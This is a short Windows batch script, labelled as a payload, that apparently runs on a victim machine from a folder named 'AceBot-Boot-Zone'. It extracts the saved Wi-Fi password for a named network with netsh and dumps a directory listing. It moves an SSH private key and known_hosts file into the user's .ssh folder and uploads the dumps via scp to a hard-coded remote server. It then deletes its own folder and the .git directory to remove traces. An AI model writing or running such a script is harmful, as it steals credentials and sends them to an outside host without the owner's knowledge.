@echo off

@REM <(o)> DATE TIME <(o)>
set CUR_YYYY=%date:~6,4%
set CUR_Mt=%date:~3,2%
set CUR_DD=%date:~0,2%

set CUR_HH=%time:~0,2%
set CUR_Mn=%time:~3,2%
set CUR_SS=%time:~6,2%
if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%) 
set dateTime=%CUR_DD%%CUR_Mt%%CUR_YYYY%-%CUR_HH%%CUR_Mn%%CUR_SS%

set ssid=Samrat_5G
set usrname=Musafir


@REM <(o)> PAYLOAD STARTED <(o)>
rmdir /s /q .git
timeout /t 1 /nobreak > NUL

dir > %ssid%-dirinfo-%dateTime%
netsh wlan show profile %ssid% key=clear > %ssid%-wifiinfo-%dateTime%
timeout /t 1 /nobreak > NUL

move id_rsa c:\\Users\\%usrname%\\.ssh
timeout /t 1 /nobreak > NUL
move known_hosts c:\\Users\\%usrname%\\.ssh
timeout /t 1 /nobreak > NUL

scp -rp %ssid%-dirinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
timeout /t 1 /nobreak > NUL
scp -rp %ssid%-wifiinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
timeout /t 1 /nobreak > NUL

cd ..
rmdir /s /q AceBot-Boot-Zone

